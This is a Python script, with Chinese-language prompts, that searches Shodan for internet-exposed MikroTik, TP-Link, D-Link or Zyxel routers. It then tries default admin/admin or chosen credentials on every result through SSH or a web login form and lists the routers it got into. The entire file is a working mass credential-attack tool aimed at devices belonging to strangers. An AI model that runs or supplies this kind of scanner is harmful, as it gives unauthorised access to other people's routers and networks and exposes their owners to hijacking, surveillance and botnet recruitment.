import shodan
import paramiko
import requests


SHODAN_API_KEY = input('请输入 Shodan API key:')

#shodan API
while True:
    if SHODAN_API_KEY.strip() == '':
        print('API key 不能为空')
        SHODAN_API_KEY = input('请输入 Shodan API key: ')
    else:
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            # 通过访问应用程序接口验证API是否有效
            api.info()
            break
        except shodan.APIError as e:
            print('错误:', e)
            SHODAN_API_KEY = input('请输入 Shodan API key: ')

#搜索路由
def search_router(query):
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        results = api.search(query)
    except:
        print('API Key 无效')
    return results['matches']

#ssh登录
def ssh_auth(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=5)
        print(f"Successfully authenticated to {ip} via SSH")
        ssh.close()
        return True
    except:
        return False

#web登录
def web_auth(ip, username, password):
    try:
        url = f"http://{ip}/login.cgi"
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data, timeout=5)
        if response.status_code == 200 or "success" in response.text:
            print(f"Successfully authenticated to {ip} via web")
            return True
        else:
            return False
    except:
        return False


def choose_auth_type():
    while True:
        auth_type = input("选择验证类型:\n"
                          "1 - SSH\n"
                          "2 - WEB\n"
                          "Enter number: ")
        if auth_type == "1" or auth_type == "2":
            return auth_type.lower()
        else:
            print("输入无效，请选择 ssh 或 web")


if __name__ == "__main__":
    print('选择路由器经销商:\n'
          '1 - MikroTik\n'
          '2 - TP-Link\n'
          '3 - D-Link\n'
          '4 - Zyxel')
    model = input('Enter number:')
    if model == '1':
        query = 'router os'
        print('Looking for Mikrotik routers...')
    elif model == '2':
        query = 'TP-Link'
        print(f'Looking for {query} routers...')
    elif model == '3':
        query = 'D-Link'
        print(f'Looking for {query} routers...')
    elif model == '4':
        query = 'Zyxel'
        print(f'Looking for {query} routers...')
    else:
        print('无效输入')
    login = 'admin'
    password = 'admin'
    results = search_router(query)
    print(f"Found {len(results)} routers")
    auth_type = choose_auth_type()
    print('输入登录凭证:\n'
          '1 - Default (admin/admin)\n'
          '2 - 自定义')
    auth_data = input('Enter number:')
    if auth_data == '1':
        login = 'admin'
        password = 'admin'
    elif auth_data == '2':
        login = str(input('Login:'))
        password = str(input('Password:'))
    else:
        print('无效输入')
    print('Searching...')
    successful_logins = []
    for result in results:
        ip = result['ip_str']
        if auth_type == "1":
            if ssh_auth(ip, login, password):
                successful_logins.append(ip)
        else:
            if web_auth(ip, login, password):
                successful_logins.append(ip)
    print(f"Successfully authenticated to {len(successful_logins)} routers: {successful_logins}")
